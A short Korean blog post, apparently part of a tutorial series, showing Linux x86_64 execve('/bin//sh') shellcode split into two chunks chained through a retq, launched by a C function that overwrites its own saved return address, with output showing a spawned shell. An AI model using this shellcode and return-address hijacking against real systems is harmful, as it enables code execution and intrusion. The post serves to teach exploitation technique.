---
layout: post
title: "Linux x86_64 shellcode 4"
date: 2014-11-10 01:54:46 +0900
comments: true
categories: 
---

이번에는 쉘코드를 2 개로 나누어서, 첫번째는 `retq` 로 끊는다. `return address` 2 개를 적재하여, `retq` 로 두번쨰 gadget 이 실행되도록 한다. 첫번째 `_shellcode` 의 `\xc3` 이 `retq` 이다.

    char *_shellcode = ""
        "\x48\x31\xd2"
        "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
        "\x48\xc1\xeb\x08"
        "\xc3"; // retq

    char *_shellcode2 = ""
        "\x53"
        "\x48\x89\xe7"
        "\x48\x31\xc0" // xor %rax,%rax
        "\x50"
        "\x57"
        "\x48\x89\xe6"
        "\xb0\x3b"
        "\x0f\x05" ;


    void explode() {
        long *ret;
        ret = (long *)&ret;
        ret++; // pass local variable
        ret++; // pass %rbp
        *ret = _shellcode;
        ret++;
        *ret = _shellcode2;
    }

    main()
    {
        explode();
    }

    z@ubuntu:~/shells% ./rop
    $

#### 참고

* [Return-Oriented Programming: Systems, Languages, and Applications](https://cseweb.ucsd.edu/~hovav/dist/rop.pdf)
